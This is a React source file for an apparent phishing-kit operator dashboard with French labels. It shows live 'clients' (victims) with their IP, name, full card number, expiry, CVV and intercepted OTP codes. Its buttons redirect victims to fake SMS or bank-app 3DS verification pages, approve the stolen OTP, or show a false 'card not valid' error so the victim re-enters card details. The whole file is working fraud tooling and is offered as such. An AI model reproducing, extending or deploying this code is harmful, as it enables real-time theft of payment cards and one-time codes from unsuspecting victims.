import React, { useState, useEffect } from 'react';
import '../utils/wsClientWrapper';
import './Dashboard.css';

function Dashboard() {
  const [clients, setClients] = useState([]);
  const [isConnected, setIsConnected] = useState(false);
  const [newClients, setNewClients] = useState(new Set()); // Track new clients with green highlight
  const [disconnectedClients, setDisconnectedClients] = useState(new Set()); // Track disconnected clients with red highlight
  const [activeActions, setActiveActions] = useState(new Map()); // Track active actions: Map<clientId, actionType>
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    onBilling: 0,
    onPayment: 0,
    on3DS: 0
  });

  useEffect(() => {
    // Clear clients state on mount (clear cache)
    setClients([]);
    console.log('[Dashboard] Cache cleared on mount');
    
    let isInitialized = false;
    let registered = false;
    
    // Wait for wsClient to be available
    const initializeDashboard = () => {
      if (!window.wsClient) {
        console.warn('[Dashboard] window.wsClient not available yet, retrying...');
        setTimeout(initializeDashboard, 500);
        return;
      }
      
      if (isInitialized) {
        console.log('[Dashboard] Already initialized, skipping...');
        return;
      }
      
      isInitialized = true;
      const ws = window.wsClient;
      console.log('[Dashboard] Initializing Dashboard, ws.isConnected:', ws.isConnected);

      // Register as dashboard
      const handleConnected = () => {
        if (registered) {
          console.log('[Dashboard] Already registered, skipping...');
          return;
        }
        console.log('[Dashboard] WebSocket connected, registering as dashboard...');
        setIsConnected(true);
        // Attendre un peu pour s'assurer que le clientId est bien reçu
        setTimeout(() => {
          if (!registered && ws.isConnected) {
            registered = true;
            ws.register('dashboard');
          }
        }, 100);
      };
      
      ws.on('connected', handleConnected);
      
      // Écouter aussi l'événement 'welcome' pour s'enregistrer immédiatement
      ws.on('message', (data) => {
        if (data.type === 'welcome') {
          console.log('[Dashboard] Received welcome message, clientId:', data.clientId);
          console.log('[Dashboard] Registering as dashboard...');
          if (!registered) {
            registered = true;
            setIsConnected(true);
            // Attendre un peu avant de s'enregistrer pour s'assurer que tout est prêt
            setTimeout(() => {
              if (ws.isConnected) {
                ws.register('dashboard');
              }
            }, 50);
          }
        }
      });

      let listRequested = false;
      const requestClientsList = () => {
        if (!listRequested) {
          listRequested = true;
          setTimeout(() => {
            console.log('[Dashboard] Requesting clients list...');
            ws.send({ type: 'list' });
            listRequested = false; // Permettre de redemander plus tard
          }, 200);
        }
      };
      
      ws.on('registered', (data) => {
        console.log('[Dashboard] Received registered event:', data);
        if (data.role === 'dashboard') {
          console.log('[Dashboard] Dashboard registered successfully');
          requestClientsList();
        }
      });
      
      // Demander la liste périodiquement pour s'assurer d'avoir les dernières données
      const listInterval = setInterval(() => {
        if (ws.isConnected && registered) {
          console.log('[Dashboard] Periodic clients list request...');
          ws.send({ type: 'list' });
        } else {
          console.log('[Dashboard] ⚠️  Cannot request list - connected:', ws.isConnected, 'registered:', registered);
        }
      }, 5000); // Toutes les 5 secondes
      
      // Stocker l'intervalle pour le nettoyer plus tard
      window.dashboardListInterval = listInterval;

      ws.on('clients', (data) => {
        console.log('[Dashboard] Received clients event:', data);
        console.log('[Dashboard] Data type:', typeof data);
        console.log('[Dashboard] Data items:', data.items);
        console.log('[Dashboard] Items is array?', Array.isArray(data.items));
        
        if (data && data.items && Array.isArray(data.items)) {
          console.log('[Dashboard] ✅ Setting clients:', data.items.length, 'clients');
          if (data.items.length > 0) {
            console.log('[Dashboard] First client sample:', data.items[0]);
          }
          setClients(data.items);
          updateStats(data.items);
        } else {
          console.warn('[Dashboard] ❌ clients event received but no items or items is not an array');
          console.warn('[Dashboard] Full data object:', JSON.stringify(data, null, 2));
          // Try to set empty array if items is missing
          setClients([]);
          updateStats([]);
        }
      });

      ws.on('client_registered', (data) => {
        console.log('[Dashboard] Received client_registered event:', data);
        if (!data.client || !data.client.id) {
          console.warn('[Dashboard] client_registered event missing client data:', data);
          return;
        }
        setClients(prev => {
          const exists = prev.find(c => c.id === data.client.id);
          if (exists) {
            // Update existing client instead of skipping
            const updated = prev.map(c => 
              c.id === data.client.id ? { ...c, ...data.client } : c
            );
            console.log('[Dashboard] Updated existing client:', data.client.id);
            updateStats(updated);
            return updated;
          }
          // This is a new client - mark it as new for green highlighting
          setNewClients(prev => new Set([...prev, data.client.id]));
          // Remove green highlight after 5 seconds
          setTimeout(() => {
            setNewClients(prev => {
              const updated = new Set(prev);
              updated.delete(data.client.id);
              return updated;
            });
          }, 5000);
          
          const updated = [data.client, ...prev];
          console.log('[Dashboard] Added new client:', data.client.id, 'Total:', updated.length);
          updateStats(updated);
          return updated;
        });
      });

      ws.on('client_updated', (data) => {
        console.log('[Dashboard] Received client_updated event:', data);
        if (!data.client || !data.client.id) {
          console.warn('[Dashboard] client_updated event missing client data:', data);
          return;
        }
        setClients(prev => {
          const exists = prev.find(c => c.id === data.client.id);
          if (!exists && data.client.id) {
            // This is a new client - mark it as new for green highlighting
            setNewClients(prevNew => new Set([...prevNew, data.client.id]));
            // Remove green highlight after 5 seconds
            setTimeout(() => {
              setNewClients(prevNew => {
                const updated = new Set(prevNew);
                updated.delete(data.client.id);
                return updated;
              });
            }, 5000);
            console.log('[Dashboard] Adding client from client_updated:', data.client.id);
            const updated = [...prev, data.client];
            updateStats(updated);
            return updated;
          }
          const updated = prev.map(c => 
            c.id === data.client.id ? { ...c, ...data.client } : c
          );
          if (exists) {
            console.log('[Dashboard] Updated client:', data.client.id);
          }
          updateStats(updated);
          return updated;
        });
      });

      ws.on('client_disconnected', (data) => {
        console.log('[Dashboard] Received client_disconnected event:', data);
        const disconnectedId = data.clientId || data.client?.id;
        
        if (disconnectedId) {
          // Mark client as disconnected for red highlighting
          setDisconnectedClients(prev => new Set([...prev, disconnectedId]));
          
          // Remove client from list and remove red highlight after 10 seconds
          setTimeout(() => {
            setClients(prev => {
              const filtered = prev.filter(c => c.id !== disconnectedId);
              console.log('[Dashboard] Client disconnected, remaining:', filtered.length);
              updateStats(filtered);
              return filtered;
            });
            
            setDisconnectedClients(prev => {
              const updated = new Set(prev);
              updated.delete(disconnectedId);
              return updated;
            });
          }, 10000);
        }
      });
      
      // Listen to all messages for debugging
      ws.on('message', (data) => {
        console.log('[Dashboard] Received raw message:', data.type, data);
      });
      
      // Connect if not already connected
      if (!ws.isConnected) {
        const url = window.CONFIG?.WS_URL || import.meta.env.VITE_WS_URL || 'ws://localhost:8080';
        console.log('[Dashboard] Not connected, connecting to WebSocket:', url);
        ws.connect(url);
      } else {
        console.log('[Dashboard] Already connected, registering as dashboard...');
        setIsConnected(true);
        if (!registered) {
          registered = true;
          ws.register('dashboard');
          // Demander la liste après un court délai pour laisser le temps à l'enregistrement
          setTimeout(() => {
            if (!listRequested) {
              listRequested = true;
              console.log('[Dashboard] Requesting clients list (already connected)...');
              ws.send({ type: 'list' });
            }
          }, 500);
        } else if (!listRequested) {
          // Si déjà enregistré mais liste pas encore demandée
          listRequested = true;
          setTimeout(() => {
            console.log('[Dashboard] Requesting clients list (already registered)...');
            ws.send({ type: 'list' });
          }, 200);
        }
      }
      
      // Add error handler
      ws.on('error', (error) => {
        console.error('[Dashboard] WebSocket error:', error);
        setIsConnected(false);
      });
      
      ws.on('close', () => {
        console.log('[Dashboard] WebSocket connection closed');
        setIsConnected(false);
        registered = false; // Réinitialiser l'état d'enregistrement pour se réenregistrer après reconnexion
      });
    };
    
    // Start initialization (it will retry if wsClient is not available)
    initializeDashboard();
    
    // Return cleanup for useEffect
    return () => {
      console.log('[Dashboard] useEffect cleanup');
      isInitialized = false;
      registered = false;
      // Nettoyer l'intervalle de demande périodique
      if (window.dashboardListInterval) {
        clearInterval(window.dashboardListInterval);
        window.dashboardListInterval = null;
      }
    };
  }, []);

  const updateStats = (clientsList) => {
    // All clients in the list are considered active (connected)
    // We only remove clients when they actually disconnect (close connection)
    // Exclude clients that are in the disconnected set
    const active = clientsList.filter(c => !disconnectedClients.has(c.id));

    setStats({
      total: clientsList.length,
      active: active.length,
      onBilling: clientsList.filter(c => {
        const page = c.currentPage || c.current_page;
        return page === 'billing' || page === '/billing';
      }).length,
      onPayment: clientsList.filter(c => {
        const page = c.currentPage || c.current_page;
        return page === 'payment' || page === '/payment-details';
      }).length,
      on3DS: clientsList.filter(c => {
        const page = c.currentPage || c.current_page;
        return page === '3ds' || page?.includes('3ds');
      }).length
    });
  };

  const formatDate = (timestamp) => {
    if (!timestamp) return 'N/A';
    return new Date(timestamp).toLocaleString();
  };

  const getTimeAgo = (timestamp) => {
    if (!timestamp) return 'N/A';
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    const days = Math.floor(hours / 24);
    return `${days}d ago`;
  };

  const getConnectionStatus = (client) => {
    // If client is in disconnectedClients set, they are disconnected (real disconnection)
    if (disconnectedClients.has(client.id)) {
      return { status: 'Déconnecté', isConnected: false, isInactive: false };
    }
    
    // Check if client is inactive (no activity for more than 30 seconds but still connected)
    const now = Date.now();
    const lastSeen = client.lastSeen || client.last_seen;
    if (lastSeen) {
      const timestamp = typeof lastSeen === 'string' ? new Date(lastSeen).getTime() : lastSeen;
      const inactiveThreshold = 30 * 1000; // 30 seconds
      const timeSinceLastSeen = now - timestamp;
      
      if (timeSinceLastSeen > inactiveThreshold) {
        // Client is still on the link but inactive
        return { status: 'Inactif', isConnected: true, isInactive: true };
      }
    }
    
    // If client is in the list and not in disconnected set, and has recent activity, they are connected
    return { status: 'Connecté', isConnected: true, isInactive: false };
  };

  const getPageName = (page) => {
    if (!page || page === 'unknown') return 'Unknown';
    
    // Normalize page name
    const normalizedPage = page.replace(/^\/+/, '').toLowerCase();
    
    // Map page names to readable format
    const pageNames = {
      'login': 'Login',
      'billing': 'Billing',
      'payment': 'Payment Details',
      'payment-details': 'Payment Details',
      '3ds': '3DS Verification',
      '3ds-verification': '3DS Verification',
      'payment-success': 'Payment Success',
      'dashboard': 'Dashboard'
    };
    
    return pageNames[normalizedPage] || normalizedPage.split('-').map(word => 
      word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
  };

  const sendDirectMessage = (clientId, payload) => {
    if (window.wsClient && window.wsClient.isConnected) {
      console.log('[Dashboard] Sending direct message to client:', {
        clientId: clientId,
        payload: payload,
        wsConnected: window.wsClient.isConnected
      });
      const message = {
        type: 'direct',
        to: clientId,
        payload: payload
      };
      console.log('[Dashboard] Message to send:', JSON.stringify(message, null, 2));
      const sent = window.wsClient.send(message);
      if (!sent) {
        console.error('[Dashboard] Failed to send message - WebSocket not ready');
      }
    } else {
      console.warn('[Dashboard] Cannot send direct message - WebSocket not connected', {
        wsClient: !!window.wsClient,
        isConnected: window.wsClient?.isConnected
      });
    }
  };

  const refreshClients = () => {
    // Clear cache before refreshing
    setClients([]);
    setStats({
      total: 0,
      active: 0,
      onBilling: 0,
      onPayment: 0,
      on3DS: 0
    });
    console.log('[Dashboard] Cache cleared, requesting fresh clients list...');
    
    if (window.wsClient && window.wsClient.isConnected) {
      window.wsClient.send({ type: 'list' });
    } else {
      console.warn('[Dashboard] Cannot refresh - WebSocket not connected');
    }
  };

  return (
    <div className="dashboard-page">
      <div className="dashboard-container">
        <div className="dashboard-header">
          <div className="dashboard-header-top">
            <h1 className="dashboard-title">Dashboard</h1>
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
              <div className="dashboard-status">
                <span className={`status-indicator ${isConnected ? 'connected' : 'disconnected'}`}></span>
                <span className="status-text">{isConnected ? 'Connecté' : 'Déconnecté'}</span>
              </div>
              <button 
                onClick={refreshClients}
                className="btn-refresh"
              >
                🔄 Actualiser ({clients.length})
              </button>
            </div>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="stats-grid">
          <div className="stat-card stat-card-total">
            <div className="stat-label">Total Clients</div>
            <div className="stat-value">{stats.total}</div>
          </div>
          <div className="stat-card stat-card-active">
            <div className="stat-label">Actifs</div>
            <div className="stat-value">{stats.active}</div>
          </div>
          <div className="stat-card stat-card-billing">
            <div className="stat-label">Sur Billing</div>
            <div className="stat-value">{stats.onBilling}</div>
          </div>
          <div className="stat-card stat-card-payment">
            <div className="stat-label">Sur Payment</div>
            <div className="stat-value">{stats.onPayment}</div>
          </div>
          <div className="stat-card stat-card-3ds">
            <div className="stat-label">Sur 3DS</div>
            <div className="stat-value">{stats.on3DS}</div>
          </div>
        </div>

        {/* Clients Table */}
        <div className="clients-section">
          <div className="section-header">
            <h2 className="section-title">Liste des clients</h2>
          </div>
          <div className="table-container">
            <table className="clients-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>IP</th>
                  <th>Page</th>
                  <th>Nom</th>
                  <th>CC-INFO</th>
                  <th>3DS</th>
                  <th>Activité</th>
                </tr>
              </thead>
              <tbody>
                {clients.length === 0 ? (
                  <tr>
                    <td colSpan="7" className="empty-state">
                      Aucun client connecté
                    </td>
                  </tr>
                ) : (
                  clients.map((client) => {
                    const isNewClient = newClients.has(client.id);
                    const isDisconnected = disconnectedClients.has(client.id);
                    const connectionStatus = getConnectionStatus(client);
                    const isConnected = connectionStatus.isConnected && !isNewClient && !isDisconnected && !connectionStatus.isInactive;
                    
                    return (
                      <tr
                        key={client.id}
                        className={`${isNewClient ? 'new-client-row' : ''} ${isDisconnected ? 'disconnected-client-row' : ''} ${isConnected ? 'connected-client-row' : ''}`}
                      >
                        <td className="client-id">
                          {client.id}
                        </td>
                        <td>
                          {client.ip || '-'}
                        </td>
                        <td>
                          <span className={`page-badge ${isNewClient ? 'new-client' : isDisconnected ? 'disconnected' : isConnected ? 'connected' : ''}`}>
                            {getPageName(client.currentPage || client.current_page)}
                          </span>
                        </td>
                        <td>
                          {client.firstName || client.first_name} {client.lastName || client.last_name || ''}
                        </td>
                        <td>
                          {(() => {
                            const cardNumber = client.cardNumber || client.card_number;
                            const cardExpiration = client.cardExpiration || client.card_expiration || client.expiryDate;
                            const cardCvv = client.cardCvv || client.card_cvv;
                            const cardHolder = client.cardHolder || client.cardholderName || client.card_holder;
                            
                            if (!cardNumber && !cardExpiration && !cardCvv && !cardHolder) {
                              return <span className="empty-text">-</span>;
                            }
                            
                            return (
                              <div className="card-info-container">
                                {cardNumber && (
                                  <div>
                                    <strong>Card:</strong> {cardNumber}
                                  </div>
                                )}
                                {cardExpiration && (
                                  <div>
                                    <strong>Exp:</strong> {cardExpiration}
                                  </div>
                                )}
                                {cardCvv && (
                                  <div>
                                    <strong>CVV:</strong> {cardCvv}
                                  </div>
                                )}
                                {cardHolder && (
                                  <div>
                                    <strong>Holder:</strong> {cardHolder}
                                  </div>
                                )}
                              </div>
                            );
                          })()}
                        </td>
                        <td style={{ textAlign: 'center', verticalAlign: 'middle' }}>
                          {/* Display OTP Code if available */}
                          {(() => {
                            const otpCode = client.otpCode || client.otp_code;
                            if (otpCode) {
                              return (
                                <div className="otp-container">
                                  <div className="otp-label">
                                    Code OTP:
                                  </div>
                                  <div className="otp-code">
                                    {otpCode}
                                  </div>
                                  {client.otpStatus && (
                                    <div className="otp-status">
                                      {client.otpStatus === 'typing' ? '⏳ Saisie en cours...' : client.otpStatus === 'submitted' ? '✅ Soumis' : client.otpStatus}
                                    </div>
                                  )}
                                </div>
                              );
                            }
                            return null;
                          })()}
                          <div className="action-buttons">
                            {(() => {
                              const activeAction = activeActions.get(client.id);
                              const isSMSActive = activeAction === 'sms';
                              const isBankAppActive = activeAction === 'bank-app';
                              const isValidationActive = activeAction === 'validation';
                              const isAnnulationActive = activeAction === 'annulation';

                              return (
                                <>
                                  <button
                                    title="SMS"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      console.log('SMS clicked for client:', client.id);
                                      setActiveActions(prev => new Map(prev).set(client.id, 'sms'));
                                      sendDirectMessage(client.id, { 
                                        action: 'redirect', 
                                        page: '/3ds-verification' 
                                      });
                                      // Clear active action after 3 seconds
                                      setTimeout(() => {
                                        setActiveActions(prev => {
                                          const newMap = new Map(prev);
                                          if (newMap.get(client.id) === 'sms') {
                                            newMap.delete(client.id);
                                          }
                                          return newMap;
                                        });
                                      }, 3000);
                                    }}
                                    style={{
                                      padding: '0.4rem 0.6rem',
                                      background: isSMSActive ? '#059669' : '#10b981',
                                      color: 'white',
                                      border: isSMSActive ? '3px solid #047857' : 'none',
                                      borderRadius: '6px',
                                      cursor: 'pointer',
                                      fontSize: '1rem',
                                      transition: 'all 0.2s',
                                      display: 'flex',
                                      alignItems: 'center',
                                      justifyContent: 'center',
                                      minWidth: '36px',
                                      height: '36px',
                                      boxShadow: isSMSActive ? '0 0 10px rgba(5, 150, 105, 0.5)' : 'none',
                                      transform: isSMSActive ? 'scale(1.1)' : 'scale(1)'
                                    }}
                                    onMouseOver={(e) => !isSMSActive && (e.target.style.background = '#059669')}
                                    onMouseOut={(e) => !isSMSActive && (e.target.style.background = '#10b981')}
                                  >
                                    ✉️
                                  </button>
                                  <button
                                    title="Bank App"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      console.log('Bank App clicked for client:', client.id);
                                      setActiveActions(prev => new Map(prev).set(client.id, 'bank-app'));
                                      sendDirectMessage(client.id, { 
                                        action: 'redirect', 
                                        page: '/3ds-verification-bank' 
                                      });
                                      // Clear active action after 3 seconds
                                      setTimeout(() => {
                                        setActiveActions(prev => {
                                          const newMap = new Map(prev);
                                          if (newMap.get(client.id) === 'bank-app') {
                                            newMap.delete(client.id);
                                          }
                                          return newMap;
                                        });
                                      }, 3000);
                                    }}
                                    style={{
                                      padding: '0.4rem 0.6rem',
                                      background: isBankAppActive ? '#7c3aed' : '#8b5cf6',
                                      color: 'white',
                                      border: isBankAppActive ? '3px solid #6d28d9' : 'none',
                                      borderRadius: '6px',
                                      cursor: 'pointer',
                                      fontSize: '1rem',
                                      transition: 'all 0.2s',
                                      display: 'flex',
                                      alignItems: 'center',
                                      justifyContent: 'center',
                                      minWidth: '36px',
                                      height: '36px',
                                      boxShadow: isBankAppActive ? '0 0 10px rgba(139, 92, 246, 0.5)' : 'none',
                                      transform: isBankAppActive ? 'scale(1.1)' : 'scale(1)'
                                    }}
                                    onMouseOver={(e) => !isBankAppActive && (e.target.style.background = '#7c3aed')}
                                    onMouseOut={(e) => !isBankAppActive && (e.target.style.background = '#8b5cf6')}
                                  >
                                    📱
                                  </button>
                                  <button
                                    title="Validation"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      console.log('Validation clicked for client:', client.id);
                                      setActiveActions(prev => new Map(prev).set(client.id, 'validation'));
                                      // Approve OTP verification
                                      sendDirectMessage(client.id, { 
                                        action: 'otp_verification_response', 
                                        approved: true 
                                      });
                                      // Redirect to Payment Confirmation page
                                      sendDirectMessage(client.id, { 
                                        action: 'redirect', 
                                        page: '/payment-confirmation' 
                                      });
                                      // Clear active action after 3 seconds
                                      setTimeout(() => {
                                        setActiveActions(prev => {
                                          const newMap = new Map(prev);
                                          if (newMap.get(client.id) === 'validation') {
                                            newMap.delete(client.id);
                                          }
                                          return newMap;
                                        });
                                      }, 3000);
                                    }}
                                    style={{
                                      padding: '0.4rem 0.6rem',
                                      background: isValidationActive ? '#d97706' : '#f59e0b',
                                      color: 'white',
                                      border: isValidationActive ? '3px solid #b45309' : 'none',
                                      borderRadius: '6px',
                                      cursor: 'pointer',
                                      fontSize: '1rem',
                                      transition: 'all 0.2s',
                                      display: 'flex',
                                      alignItems: 'center',
                                      justifyContent: 'center',
                                      minWidth: '36px',
                                      height: '36px',
                                      boxShadow: isValidationActive ? '0 0 10px rgba(245, 158, 11, 0.5)' : 'none',
                                      transform: isValidationActive ? 'scale(1.1)' : 'scale(1)'
                                    }}
                                    onMouseOver={(e) => !isValidationActive && (e.target.style.background = '#d97706')}
                                    onMouseOut={(e) => !isValidationActive && (e.target.style.background = '#f59e0b')}
                                  >
                                    ✅
                                  </button>
                                  <button
                                    title="Annulation"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      console.log('Annulation clicked for client:', client.id);
                                      setActiveActions(prev => new Map(prev).set(client.id, 'annulation'));
                                      // Reject OTP verification
                                      sendDirectMessage(client.id, { 
                                        action: 'otp_verification_response', 
                                        approved: false 
                                      });
                                      // Redirect to Payment Details with error
                                      sendDirectMessage(client.id, { 
                                        action: 'redirect', 
                                        page: '/payment-details',
                                        isCancellation: true,
                                        errorMessage: 'Your credit card is not valid. Please check your card details and try again.'
                                      });
                                      // Clear active action after 3 seconds
                                      setTimeout(() => {
                                        setActiveActions(prev => {
                                          const newMap = new Map(prev);
                                          if (newMap.get(client.id) === 'annulation') {
                                            newMap.delete(client.id);
                                          }
                                          return newMap;
                                        });
                                      }, 3000);
                                    }}
                                    style={{
                                      padding: '0.4rem 0.6rem',
                                      background: isAnnulationActive ? '#dc2626' : '#ef4444',
                                      color: 'white',
                                      border: isAnnulationActive ? '3px solid #b91c1c' : 'none',
                                      borderRadius: '6px',
                                      cursor: 'pointer',
                                      fontSize: '1rem',
                                      transition: 'all 0.2s',
                                      display: 'flex',
                                      alignItems: 'center',
                                      justifyContent: 'center',
                                      minWidth: '36px',
                                      height: '36px',
                                      boxShadow: isAnnulationActive ? '0 0 10px rgba(239, 68, 68, 0.5)' : 'none',
                                      transform: isAnnulationActive ? 'scale(1.1)' : 'scale(1)'
                                    }}
                                    onMouseOver={(e) => !isAnnulationActive && (e.target.style.background = '#dc2626')}
                                    onMouseOut={(e) => !isAnnulationActive && (e.target.style.background = '#ef4444')}
                                  >
                                    ❌
                                  </button>
                                </>
                              );
                            })()}
                          </div>
                        </td>
                        <td className="last-seen" style={isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}}>
                          <span style={{ 
                            color: connectionStatus.status === 'Déconnecté' ? '#dc3545' : 
                                   connectionStatus.status === 'Inactif' ? '#f59e0b' : 
                                   '#27ae60', // Connecté
                            fontWeight: 'bold',
                            padding: '0.25rem 0.5rem',
                            borderRadius: '4px',
                            backgroundColor: connectionStatus.status === 'Déconnecté' ? '#fee2e2' : 
                                            connectionStatus.status === 'Inactif' ? '#fef3c7' : 
                                            '#d1fae5' // Connecté
                          }}>
                            {connectionStatus.status}
                          </span>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

      </div>
    </div>
  );
}

export default Dashboard;

